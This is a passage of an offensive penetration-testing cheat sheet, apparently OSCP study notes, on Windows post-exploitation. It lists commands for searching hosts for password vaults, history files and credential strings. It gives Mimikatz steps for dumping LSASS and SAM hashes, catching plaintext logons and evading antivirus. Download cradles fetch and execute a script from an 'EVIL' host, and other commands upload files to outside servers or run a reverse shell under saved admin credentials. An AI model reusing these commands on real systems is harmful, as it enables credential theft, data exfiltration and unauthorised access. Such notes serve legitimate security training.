<div class="language-powershell highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a><span class="n">attrib</span> <span class="c"># to find hidden files</span>
</span><span id="__span-51-2"><a id="__codelineno-51-2" name="__codelineno-51-2" href="#__codelineno-51-2"></a>
</span><span id="__span-51-3"><a id="__codelineno-51-3" name="__codelineno-51-3" href="#__codelineno-51-3"></a><span class="c"># searching through sensitive files</span>
</span><span id="__span-51-4"><a id="__codelineno-51-4" name="__codelineno-51-4" href="#__codelineno-51-4"></a><span class="nb">Get-ChildItem</span> <span class="n">-Path</span> <span class="n">C</span><span class="p">:\</span>  <span class="o">-File</span> <span class="n">-Recurse</span> <span class="n">-ErrorAction</span> <span class="n">SilentlyContinue</span> <span class="n">-Include</span> <span class="p">*.</span><span class="n">kdbx</span>
</span><span id="__span-51-5"><a id="__codelineno-51-5" name="__codelineno-51-5" href="#__codelineno-51-5"></a><span class="nb">Get-ChildItem</span> <span class="n">-Path</span> <span class="n">C</span><span class="p">:\</span><span class="n">xampp</span> <span class="o">-File</span> <span class="n">-Recurse</span> <span class="n">-ErrorAction</span> <span class="n">SilentlyContinue</span> <span class="n">-Include</span> <span class="p">*.</span><span class="n">txt</span><span class="p">,*.</span><span class="n">log</span><span class="p">,*.</span><span class="n">docx</span><span class="p">,*.</span><span class="n">pdf</span><span class="p">,*.</span><span class="n">docx</span><span class="p">,*.</span><span class="n">ini</span><span class="p">,*.</span><span class="n">config</span><span class="p">,*.</span><span class="n">xml</span>
</span><span id="__span-51-6"><a id="__codelineno-51-6" name="__codelineno-51-6" href="#__codelineno-51-6"></a><span class="nb">Get-ChildItem</span> <span class="n">-Path</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span> <span class="o">-File</span> <span class="n">-Recurse</span> <span class="n">-ErrorAction</span> <span class="n">SilentlyContinue</span> <span class="n">-Include</span> <span class="p">*.</span><span class="n">kdbx</span><span class="p">,</span> <span class="p">*.</span><span class="n">txt</span><span class="p">,*.</span><span class="n">pdf</span><span class="p">,*.</span><span class="n">xls</span><span class="p">,*.</span><span class="n">xlsx</span><span class="p">,*.</span><span class="n">doc</span><span class="p">,*.</span><span class="n">docx</span><span class="p">,*.</span><span class="n">conf</span><span class="p">,*.</span><span class="n">xml</span><span class="p">,*.</span><span class="n">json</span><span class="p">,*.</span><span class="n">db</span><span class="p">,*.</span><span class="n">log</span><span class="p">,*.</span><span class="n">ini</span><span class="p">,*.</span><span class="n">config</span><span class="p">,*.</span><span class="n">xml</span> 
</span><span id="__span-51-7"><a id="__codelineno-51-7" name="__codelineno-51-7" href="#__codelineno-51-7"></a>
</span><span id="__span-51-8"><a id="__codelineno-51-8" name="__codelineno-51-8" href="#__codelineno-51-8"></a><span class="nb">dir </span><span class="n">-Hidden</span> <span class="o">-File</span> <span class="n">-Recurse</span> <span class="n">-ErrorAction</span> <span class="n">SilentlyContinue</span> <span class="n">-Include</span> <span class="n">ConsoleHost_history</span><span class="p">.</span><span class="n">txt</span>
</span><span id="__span-51-9"><a id="__codelineno-51-9" name="__codelineno-51-9" href="#__codelineno-51-9"></a>
</span><span id="__span-51-10"><a id="__codelineno-51-10" name="__codelineno-51-10" href="#__codelineno-51-10"></a><span class="nv">$users</span> <span class="p">=</span> <span class="p">@(</span><span class="s1">&#39;Administrator.OSCP&#39;</span><span class="p">,</span><span class="s1">&#39;Administrator&#39;</span><span class="p">,</span><span class="s1">&#39;celia.almeda&#39;</span><span class="p">,</span><span class="s1">&#39;eric.wallows&#39;</span><span class="p">,</span><span class="s1">&#39;Mary.Williams&#39;</span><span class="p">,</span><span class="s1">&#39;web_svc&#39;</span><span class="p">,</span><span class="s1">&#39;support&#39;</span><span class="p">)</span>
</span><span id="__span-51-11"><a id="__codelineno-51-11" name="__codelineno-51-11" href="#__codelineno-51-11"></a><span class="k">ForEach</span><span class="p">(</span><span class="nv">$var</span> <span class="k">in</span> <span class="nv">$users</span><span class="p">){</span> 
</span><span id="__span-51-12"><a id="__codelineno-51-12" name="__codelineno-51-12" href="#__codelineno-51-12"></a> <span class="nb">dir </span><span class="s2">&quot;C:\Users\$var\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt&quot;</span>
</span><span id="__span-51-13"><a id="__codelineno-51-13" name="__codelineno-51-13" href="#__codelineno-51-13"></a> <span class="nb">type </span><span class="s2">&quot;C:\Users\$var\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt&quot;</span>
</span><span id="__span-51-14"><a id="__codelineno-51-14" name="__codelineno-51-14" href="#__codelineno-51-14"></a>
</span><span id="__span-51-15"><a id="__codelineno-51-15" name="__codelineno-51-15" href="#__codelineno-51-15"></a><span class="p">}</span>
</span><span id="__span-51-16"><a id="__codelineno-51-16" name="__codelineno-51-16" href="#__codelineno-51-16"></a><span class="c"># searching for sensitive strings</span>
</span><span id="__span-51-17"><a id="__codelineno-51-17" name="__codelineno-51-17" href="#__codelineno-51-17"></a><span class="n">findstr</span> <span class="p">/</span><span class="n">S</span> <span class="p">/</span><span class="n">I</span> <span class="p">/</span><span class="n">M</span> <span class="s2">&quot;your_search_string&quot;</span> <span class="p">*.*</span>
</span><span id="__span-51-18"><a id="__codelineno-51-18" name="__codelineno-51-18" href="#__codelineno-51-18"></a><span class="n">findstr</span> <span class="s2">&quot;password&quot;</span> <span class="n">config</span><span class="p">.</span><span class="n">ini</span>
</span><span id="__span-51-19"><a id="__codelineno-51-19" name="__codelineno-51-19" href="#__codelineno-51-19"></a><span class="n">findstr</span> <span class="p">/</span><span class="n">s</span> <span class="p">/</span><span class="n">i</span> <span class="s2">&quot;admin&quot;</span> <span class="p">*.</span><span class="n">txt</span>      <span class="p">::</span> <span class="p">/</span><span class="n">s</span> <span class="p">=</span> <span class="n">recursive</span><span class="p">,</span> <span class="p">/</span><span class="n">i</span> <span class="p">=</span> <span class="n">ignore</span> <span class="n">case</span>
</span><span id="__span-51-20"><a id="__codelineno-51-20" name="__codelineno-51-20" href="#__codelineno-51-20"></a><span class="n">findstr</span> <span class="p">/</span><span class="nb">r </span><span class="s2">&quot;^ERROR&quot;</span> <span class="n">log</span><span class="p">.</span><span class="n">txt</span>      <span class="p">::</span> <span class="p">/</span><span class="nb">r </span><span class="p">=</span> <span class="n">regex</span>
</span><span id="__span-51-21"><a id="__codelineno-51-21" name="__codelineno-51-21" href="#__codelineno-51-21"></a><span class="n">findstr</span> <span class="p">/</span><span class="nb">si </span><span class="n">password</span> <span class="n">_</span><span class="p">.</span><span class="n">txt</span> <span class="p">|</span><span class="n">_</span> <span class="p">.</span><span class="n">xml</span> <span class="p">|</span> <span class="p">*.</span><span class="n">ini</span>
</span><span id="__span-51-22"><a id="__codelineno-51-22" name="__codelineno-51-22" href="#__codelineno-51-22"></a>
</span><span id="__span-51-23"><a id="__codelineno-51-23" name="__codelineno-51-23" href="#__codelineno-51-23"></a><span class="c"># powershell variant</span>
</span><span id="__span-51-24"><a id="__codelineno-51-24" name="__codelineno-51-24" href="#__codelineno-51-24"></a><span class="nb">Select-String</span> <span class="n">-Pattern</span> <span class="s2">&quot;pattern&quot;</span> <span class="n">-Path</span> <span class="n">filename</span><span class="p">.</span><span class="n">txt</span>
</span><span id="__span-51-25"><a id="__codelineno-51-25" name="__codelineno-51-25" href="#__codelineno-51-25"></a><span class="nb">sls </span><span class="s2">&quot;pattern&quot;</span> <span class="n">file</span><span class="p">.</span><span class="n">txt</span>
</span><span id="__span-51-26"><a id="__codelineno-51-26" name="__codelineno-51-26" href="#__codelineno-51-26"></a><span class="nb">sls </span><span class="s2">&quot;pattern&quot;</span>
</span><span id="__span-51-27"><a id="__codelineno-51-27" name="__codelineno-51-27" href="#__codelineno-51-27"></a>
</span><span id="__span-51-28"><a id="__codelineno-51-28" name="__codelineno-51-28" href="#__codelineno-51-28"></a><span class="c"># specific files</span>
</span><span id="__span-51-29"><a id="__codelineno-51-29" name="__codelineno-51-29" href="#__codelineno-51-29"></a><span class="nb">dir </span><span class="p">/</span><span class="n">s</span> <span class="n">sysprep</span><span class="p">.</span><span class="n">inf</span> <span class="n">sysprep</span><span class="p">.</span><span class="n">xml</span> <span class="n">unattended</span><span class="p">.</span><span class="n">xml</span> <span class="n">unattend</span><span class="p">.</span><span class="n">xml</span> <span class="n">unattended</span><span class="p">.</span><span class="n">txt</span> <span class="n">2</span><span class="p">&gt;</span><span class="n">null</span>
</span><span id="__span-51-30"><a id="__codelineno-51-30" name="__codelineno-51-30" href="#__codelineno-51-30"></a><span class="nb">type </span><span class="n">C</span><span class="p">:\</span><span class="n">xampp</span><span class="p">\</span><span class="n">passwords</span><span class="p">.</span><span class="n">txt</span> <span class="p">|</span> <span class="nb">type </span><span class="n">C</span><span class="p">:\</span><span class="n">xampp</span><span class="p">\</span><span class="n">mysql</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">my</span><span class="p">.</span><span class="n">ini</span>
</span></code></pre></div>
<h4 id="imp-files_1">🗄 Imp Files</h4>
<ul>
<li><a href="https://github.com/InfoSecWarrior/Offensive-Payloads/blob/main/Windows-Sensitive-Files.txt">Sensitive Files Location in Windows</a></li>
<li><a href="https://github.com/soffensive/windowsblindread/blob/master/windows-files.txt">Comprehensive One</a></li>
<li><a href="https://github.com/DragonJAR/Security-Wordlist/blob/main/LFI-WordList-Windows">LFI Wordlist</a>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">username</span><span class="p">\</span><span class="n">AppData</span><span class="p">\</span><span class="n">Roaming</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">PowerShell</span><span class="p">\</span><span class="n">PSReadLine</span><span class="p">\</span><span class="n">ConsoleHost_history</span><span class="p">.</span><span class="n">txt</span>
</span><span id="__span-52-2"><a id="__codelineno-52-2" name="__codelineno-52-2" href="#__codelineno-52-2"></a><span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">System32</span><span class="p">\</span><span class="n">drivers</span><span class="p">\</span><span class="n">etc</span><span class="p">\</span><span class="n">hosts</span>
</span><span id="__span-52-3"><a id="__codelineno-52-3" name="__codelineno-52-3" href="#__codelineno-52-3"></a><span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Panther</span><span class="p">\</span><span class="n">Unattend</span><span class="p">.</span><span class="n">xml</span>
</span><span id="__span-52-4"><a id="__codelineno-52-4" name="__codelineno-52-4" href="#__codelineno-52-4"></a><span class="n">C</span><span class="p">:\</span><span class="n">windows</span><span class="p">.</span><span class="n">old</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">System32</span><span class="p">\</span><span class="n">SAM</span>
</span><span id="__span-52-5"><a id="__codelineno-52-5" name="__codelineno-52-5" href="#__codelineno-52-5"></a><span class="n">C</span><span class="p">:\</span><span class="n">windows</span><span class="p">.</span><span class="n">old</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">System32</span><span class="p">\</span><span class="n">SYSTEM</span>
</span><span id="__span-52-6"><a id="__codelineno-52-6" name="__codelineno-52-6" href="#__codelineno-52-6"></a><span class="n">C</span><span class="p">:\</span><span class="n">xampp</span><span class="p">\</span><span class="n">mysql</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">my</span><span class="p">.</span><span class="n">ini</span>
</span><span id="__span-52-7"><a id="__codelineno-52-7" name="__codelineno-52-7" href="#__codelineno-52-7"></a><span class="n">C</span><span class="p">:\</span><span class="n">xampp</span><span class="p">\</span><span class="n">passwords</span><span class="p">.</span><span class="n">txt</span>
</span><span id="__span-52-8"><a id="__codelineno-52-8" name="__codelineno-52-8" href="#__codelineno-52-8"></a>
</span><span id="__span-52-9"><a id="__codelineno-52-9" name="__codelineno-52-9" href="#__codelineno-52-9"></a>
</span><span id="__span-52-10"><a id="__codelineno-52-10" name="__codelineno-52-10" href="#__codelineno-52-10"></a><span class="n">C</span><span class="p">:\</span><span class="n">ProgramData</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="nb">Group </span><span class="n">Policy</span><span class="p">\</span><span class="nb">history </span>
</span><span id="__span-52-11"><a id="__codelineno-52-11" name="__codelineno-52-11" href="#__codelineno-52-11"></a><span class="n">C</span><span class="p">:\</span><span class="n">Documents</span> <span class="n">and</span> <span class="n">Settings</span><span class="p">\</span><span class="n">All</span> <span class="n">Users</span><span class="p">\</span><span class="n">Application</span> <span class="n">Data</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="nb">Group </span><span class="n">Policy</span><span class="p">\</span><span class="nb">history</span>
</span><span id="__span-52-12"><a id="__codelineno-52-12" name="__codelineno-52-12" href="#__codelineno-52-12"></a><span class="n">Groups</span><span class="p">.</span><span class="n">xml</span>
</span><span id="__span-52-13"><a id="__codelineno-52-13" name="__codelineno-52-13" href="#__codelineno-52-13"></a><span class="n">Services</span><span class="p">.</span><span class="n">xml</span>
</span><span id="__span-52-14"><a id="__codelineno-52-14" name="__codelineno-52-14" href="#__codelineno-52-14"></a><span class="n">Scheduledtasks</span><span class="p">.</span><span class="n">xml</span>
</span><span id="__span-52-15"><a id="__codelineno-52-15" name="__codelineno-52-15" href="#__codelineno-52-15"></a><span class="n">DataSources</span><span class="p">.</span><span class="n">xml</span>
</span><span id="__span-52-16"><a id="__codelineno-52-16" name="__codelineno-52-16" href="#__codelineno-52-16"></a><span class="n">Printers</span><span class="p">.</span><span class="n">xml</span>
</span><span id="__span-52-17"><a id="__codelineno-52-17" name="__codelineno-52-17" href="#__codelineno-52-17"></a><span class="n">Drives</span><span class="p">.</span><span class="n">xml</span>
</span></code></pre></div></li>
</ul>
<h3 id="mimikatz">Mimikatz</h3>
<p><div class="language-powershell highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a><span class="n">privilege</span><span class="p">::</span><span class="n">debug</span>    <span class="c"># to enable SeDebugPrivilege for getting access to other user process like lsass (SYSTEM user)   1</span>
</span><span id="__span-53-2"><a id="__codelineno-53-2" name="__codelineno-53-2" href="#__codelineno-53-2"></a><span class="n">token</span><span class="p">::</span><span class="n">elevate</span>   <span class="c"># to elevate privileges to SYSTEM user NEEDED       2</span>
</span><span id="__span-53-3"><a id="__codelineno-53-3" name="__codelineno-53-3" href="#__codelineno-53-3"></a><span class="n">sekurlsa</span><span class="p">::</span><span class="n">logonpasswords</span>   <span class="c"># extract password from all sources like LSASS for domain user hashes</span>
</span><span id="__span-53-4"><a id="__codelineno-53-4" name="__codelineno-53-4" href="#__codelineno-53-4"></a><span class="n">lsadump</span><span class="p">::</span><span class="n">sam</span>   <span class="c"># only dumps from SAM database for local user account hashes</span>
</span><span id="__span-53-5"><a id="__codelineno-53-5" name="__codelineno-53-5" href="#__codelineno-53-5"></a>
</span><span id="__span-53-6"><a id="__codelineno-53-6" name="__codelineno-53-6" href="#__codelineno-53-6"></a><span class="c"># if credential guard enabled and wanna extract Domain users credentials</span>
</span><span id="__span-53-7"><a id="__codelineno-53-7" name="__codelineno-53-7" href="#__codelineno-53-7"></a><span class="n">misc</span><span class="p">::</span><span class="n">memssp</span>    <span class="c"># but now wait till a domain user logs in and our SSP used as an auth process to catch plaintext pass</span>
</span><span id="__span-53-8"><a id="__codelineno-53-8" name="__codelineno-53-8" href="#__codelineno-53-8"></a><span class="c"># credentials stored in C:\Windows\System32\mimilsa.log</span>
</span><span id="__span-53-9"><a id="__codelineno-53-9" name="__codelineno-53-9" href="#__codelineno-53-9"></a>
</span><span id="__span-53-10"><a id="__codelineno-53-10" name="__codelineno-53-10" href="#__codelineno-53-10"></a><span class="nb">dir </span><span class="p">\\</span><span class="n">serviceserver</span><span class="p">\</span><span class="n">share</span>  <span class="c"># to cache kerberos ticket</span>
</span><span id="__span-53-11"><a id="__codelineno-53-11" name="__codelineno-53-11" href="#__codelineno-53-11"></a><span class="n">sekurlsa</span><span class="p">::</span><span class="n">tickets</span>
</span><span id="__span-53-12"><a id="__codelineno-53-12" name="__codelineno-53-12" href="#__codelineno-53-12"></a>
</span><span id="__span-53-13"><a id="__codelineno-53-13" name="__codelineno-53-13" href="#__codelineno-53-13"></a><span class="c"># Impacket Secretsdump can be used to dump in the AD</span>
</span><span id="__span-53-14"><a id="__codelineno-53-14" name="__codelineno-53-14" href="#__codelineno-53-14"></a><span class="n">impacket-secretsdump</span> <span class="n">-just-dc-ntlm</span> <span class="n">test</span><span class="p">.</span><span class="n">local</span><span class="p">/</span><span class="n">john</span><span class="p">:</span><span class="n">password123</span><span class="nv">@10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">1</span>
</span></code></pre></div>
We can find an excellent reference guide <a href="https://adsecurity.org/?page_id=1821">here</a>.
In case of Antivirus, execute Mimikatz directly from memory using an injector like <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1">PowerShell</a>, or use a built-in tool like Task Manager to dump the entire <a href="https://www.whiteoaksecurity.com/blog/attacks-defenses-dumping-lsass-no-mimikatz/">LSASS process memory</a>, move the dumped data to a helper machine, and then load the data into <a href="http://www.fuzzysecurity.com/tutorials/18.html">Mimikatz</a>.</p>
<h5 id="av-enabled-machine">AV enabled machine</h5>
<p>Mimikatz version to use in AV enabled machine <a href="https://github.com/okankurtuluss/Invoke-Mimikatz-Bypass">GitHub Repo</a></p>
<h3 id="file-transfer-download_1">📂File Transfer (Download)</h3>
<p><a href="https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/file-transfer-techniques">More file transfer techniques</a></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a><span class="c"># Download Cradles</span>
</span><span id="__span-54-2"><a id="__codelineno-54-2" name="__codelineno-54-2" href="#__codelineno-54-2"></a><span class="nb">IEX </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">Webclient</span><span class="p">).</span><span class="n">downloadstring</span><span class="p">(</span><span class="s2">&quot;http://EVIL/evil.ps1&quot;</span><span class="p">)</span>
</span><span id="__span-54-3"><a id="__codelineno-54-3" name="__codelineno-54-3" href="#__codelineno-54-3"></a><span class="c"># PowerShell 3.0+</span>
</span><span id="__span-54-4"><a id="__codelineno-54-4" name="__codelineno-54-4" href="#__codelineno-54-4"></a><span class="nb">IEX </span><span class="p">(</span><span class="nb">iwr </span><span class="s1">&#39;http://EVIL/evil.ps1&#39;</span><span class="p">)</span>
</span><span id="__span-54-5"><a id="__codelineno-54-5" name="__codelineno-54-5" href="#__codelineno-54-5"></a>
</span><span id="__span-54-6"><a id="__codelineno-54-6" name="__codelineno-54-6" href="#__codelineno-54-6"></a><span class="nb">iwr </span><span class="n">-uri</span> <span class="n">http</span><span class="p">://</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">48</span><span class="p">.</span><span class="n">3</span><span class="p">/</span><span class="n">winPEASx64</span><span class="p">.</span><span class="n">exe</span> <span class="n">-Outfile</span> <span class="n">winPEAS</span><span class="p">.</span><span class="n">exe</span>
</span><span id="__span-54-7"><a id="__codelineno-54-7" name="__codelineno-54-7" href="#__codelineno-54-7"></a>
</span><span id="__span-54-8"><a id="__codelineno-54-8" name="__codelineno-54-8" href="#__codelineno-54-8"></a><span class="n">powershell</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadFile</span><span class="p">(</span><span class="s1">&#39;http://192.168.31.141/ignite.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;ignite.txt&#39;</span><span class="p">)</span>
</span><span id="__span-54-9"><a id="__codelineno-54-9" name="__codelineno-54-9" href="#__codelineno-54-9"></a>
</span><span id="__span-54-10"><a id="__codelineno-54-10" name="__codelineno-54-10" href="#__codelineno-54-10"></a><span class="n">certutil</span> <span class="n">-urlcache</span> <span class="n">-split</span> <span class="o">-f</span> <span class="n">http</span><span class="p">://</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">31</span><span class="p">.</span><span class="n">141</span><span class="p">/</span><span class="n">ignite</span><span class="p">.</span><span class="n">txt</span> <span class="n">ignite</span><span class="p">.</span><span class="n">txt</span> <span class="c"># -split for splitting large files</span>
</span><span id="__span-54-11"><a id="__codelineno-54-11" name="__codelineno-54-11" href="#__codelineno-54-11"></a><span class="n">bitsadmin</span> <span class="p">/</span><span class="n">transfer</span> <span class="n">job</span> <span class="n">http</span><span class="p">://</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">31</span><span class="p">.</span><span class="n">141</span><span class="p">/</span><span class="n">ignite</span><span class="p">.</span><span class="n">txt</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">Public</span><span class="p">\</span><span class="n">ignite</span><span class="p">.</span><span class="n">txt</span>
</span><span id="__span-54-12"><a id="__codelineno-54-12" name="__codelineno-54-12" href="#__codelineno-54-12"></a>
</span><span id="__span-54-13"><a id="__codelineno-54-13" name="__codelineno-54-13" href="#__codelineno-54-13"></a><span class="nb">copy </span><span class="p">\\</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">31</span><span class="p">.</span><span class="n">141</span><span class="p">\</span><span class="n">share</span><span class="p">\</span><span class="n">ignite</span><span class="p">.</span><span class="n">txt</span> <span class="p">.</span>  <span class="c"># for smb data download</span>
</span></code></pre></div>
<h4 id="upload-exfiltration_1">(Upload) - Exfiltration</h4>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a><span class="nv">$uri</span> <span class="p">=</span> <span class="s2">&quot;https://www.example.com/submit&quot;</span>
</span><span id="__span-55-2"><a id="__codelineno-55-2" name="__codelineno-55-2" href="#__codelineno-55-2"></a><span class="nv">$body</span> <span class="p">=</span> <span class="s2">&quot;param1=value1&amp;param2=value2&quot;</span> <span class="c"># URL-encoded form data</span>
</span><span id="__span-55-3"><a id="__codelineno-55-3" name="__codelineno-55-3" href="#__codelineno-55-3"></a>
</span><span id="__span-55-4"><a id="__codelineno-55-4" name="__codelineno-55-4" href="#__codelineno-55-4"></a><span class="nb">Invoke-WebRequest</span> <span class="n">-Uri</span> <span class="nv">$uri</span> <span class="n">-Method</span> <span class="n">Post</span> <span class="n">-Body</span> <span class="nv">$body</span> <span class="n">-ContentType</span> <span class="s2">&quot;application/x-www-form-urlencoded&quot;</span>
</span><span id="__span-55-5"><a id="__codelineno-55-5" name="__codelineno-55-5" href="#__codelineno-55-5"></a>
</span><span id="__span-55-6"><a id="__codelineno-55-6" name="__codelineno-55-6" href="#__codelineno-55-6"></a>
</span><span id="__span-55-7"><a id="__codelineno-55-7" name="__codelineno-55-7" href="#__codelineno-55-7"></a><span class="nv">$filePath</span> <span class="p">=</span> <span class="s2">&quot;C:\path\to\your\file.txt&quot;</span>
</span><span id="__span-55-8"><a id="__codelineno-55-8" name="__codelineno-55-8" href="#__codelineno-55-8"></a><span class="nb">Invoke-WebRequest</span> <span class="n">-Uri</span> <span class="nv">$uri</span> <span class="n">-Method</span> <span class="n">POST</span> <span class="n">-InFile</span> <span class="nv">$filePath</span> <span class="n">-ContentType</span> <span class="s2">&quot;application/octet-stream&quot;</span>
</span><span id="__span-55-9"><a id="__codelineno-55-9" name="__codelineno-55-9" href="#__codelineno-55-9"></a>
</span><span id="__span-55-10"><a id="__codelineno-55-10" name="__codelineno-55-10" href="#__codelineno-55-10"></a><span class="nb">wget </span><span class="n">-Method</span> <span class="n">POST</span> <span class="n">-Uri</span> <span class="n">http</span><span class="p">://</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">45</span><span class="p">.</span><span class="n">x</span><span class="p">/</span><span class="n">file</span><span class="p">.</span><span class="n">exe</span>  <span class="n">-InFile</span> <span class="s2">&quot;./file.exe&quot;</span> 
</span><span id="__span-55-11"><a id="__codelineno-55-11" name="__codelineno-55-11" href="#__codelineno-55-11"></a>
</span><span id="__span-55-12"><a id="__codelineno-55-12" name="__codelineno-55-12" href="#__codelineno-55-12"></a><span class="n">curl</span><span class="p">.</span><span class="n">exe</span> <span class="n">-X</span> <span class="n">POST</span> <span class="o">-F</span> <span class="s2">&quot;file=@C:\path\to\your\file.txt&quot;</span> <span class="n">http</span><span class="p">://</span><span class="n">your-server</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">upload</span>
</span><span id="__span-55-13"><a id="__codelineno-55-13" name="__codelineno-55-13" href="#__codelineno-55-13"></a>
</span><span id="__span-55-14"><a id="__codelineno-55-14" name="__codelineno-55-14" href="#__codelineno-55-14"></a>
</span><span id="__span-55-15"><a id="__codelineno-55-15" name="__codelineno-55-15" href="#__codelineno-55-15"></a><span class="n">net</span> <span class="n">use</span> <span class="n">Z</span><span class="p">:</span> <span class="p">\\&lt;</span><span class="n">SMB_SERVER_IP</span><span class="p">&gt;\</span><span class="n">sharename</span>
</span><span id="__span-55-16"><a id="__codelineno-55-16" name="__codelineno-55-16" href="#__codelineno-55-16"></a><span class="n">net</span> <span class="n">use</span> <span class="n">Z</span><span class="p">:</span> <span class="p">\\&lt;</span><span class="n">SMB_SERVER_IP</span><span class="p">&gt;\</span><span class="n">sharename</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">USERNAME</span> <span class="n">PASSWORD</span>
</span><span id="__span-55-17"><a id="__codelineno-55-17" name="__codelineno-55-17" href="#__codelineno-55-17"></a><span class="nb">copy </span><span class="n">C</span><span class="p">:\</span><span class="n">path</span><span class="p">\</span><span class="n">to</span><span class="p">\</span><span class="n">your</span><span class="p">\</span><span class="n">file</span><span class="p">.</span><span class="n">txt</span> <span class="n">Z</span><span class="p">:\</span>
</span><span id="__span-55-18"><a id="__codelineno-55-18" name="__codelineno-55-18" href="#__codelineno-55-18"></a>
</span><span id="__span-55-19"><a id="__codelineno-55-19" name="__codelineno-55-19" href="#__codelineno-55-19"></a><span class="c"># encode and copy paste</span>
</span><span id="__span-55-20"><a id="__codelineno-55-20" name="__codelineno-55-20" href="#__codelineno-55-20"></a><span class="n">certutil</span> <span class="n">-encode</span> <span class="n">input</span><span class="p">.</span><span class="n">txt</span> <span class="n">output</span><span class="p">.</span><span class="n">b64</span>
</span></code></pre></div>
<h3 id="privesc-vectors_1">⬆ PrivEsc Vectors</h3>
<h4 id="access-after-creds">Access After Creds</h4>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a><span class="c"># escalation through saved creds</span>
</span><span id="__span-56-2"><a id="__codelineno-56-2" name="__codelineno-56-2" href="#__codelineno-56-2"></a><span class="n">cmdkey</span> <span class="p">/</span><span class="n">list</span>
</span><span id="__span-56-3"><a id="__codelineno-56-3" name="__codelineno-56-3" href="#__codelineno-56-3"></a><span class="n">runas</span> <span class="p">/</span><span class="n">savecred</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">admin</span> <span class="n">reverse_shell</span><span class="p">.</span><span class="n">exe</span>
</span><span id="__span-56-4"><a id="__codelineno-56-4" name="__codelineno-56-4" href="#__codelineno-56-4"></a>
</span><span id="__span-56-5"><a id="__codelineno-56-5" name="__codelineno-56-5" href="#__codelineno-56-5"></a>
</span><span id="__span-56-6"><a id="__codelineno-56-6" name="__codelineno-56-6" href="#__codelineno-56-6"></a><span class="c"># Use runas to get access as new user if we have already GUI access to machine and new user not in RDP or WinRM</span>
</span><span id="__span-56-7"><a id="__codelineno-56-7" name="__codelineno-56-7" href="#__codelineno-56-7"></a><span class="n">runas</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">backupadmin</span> <span class="n">cmd</span>
</span><span id="__span-56-8"><a id="__codelineno-56-8" name="__codelineno-56-8" href="#__codelineno-56-8"></a>
</span><span id="__span-56-9"><a id="__codelineno-56-9" name="__codelineno-56-9" href="#__codelineno-56-9"></a><span class="c"># winrm login through powershell</span>
</span><span id="__span-56-10"><a id="__codelineno-56-10" name="__codelineno-56-10" href="#__codelineno-56-10"></a><span class="nv">$password</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s2">&quot;qwertqwertqwert123!!&quot;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
</span><span id="__span-56-11"><a id="__codelineno-56-11" name="__codelineno-56-11" href="#__codelineno-56-11"></a><span class="nv">$cred</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span><span class="p">(</span><span class="s2">&quot;daveadmin&quot;</span><span class="p">,</span> <span class="nv">$password</span><span class="p">)</span>
</span><span id="__span-56-12"><a id="__codelineno-56-12" name="__codelineno-56-12" href="#__codelineno-56-12"></a><span class="nb">Enter-PSSession</span> <span class="n">-ComputerName</span> <span class="n">CLIENTWK220</span> <span class="n">-Credential</span> <span class="nv">$cred</span>
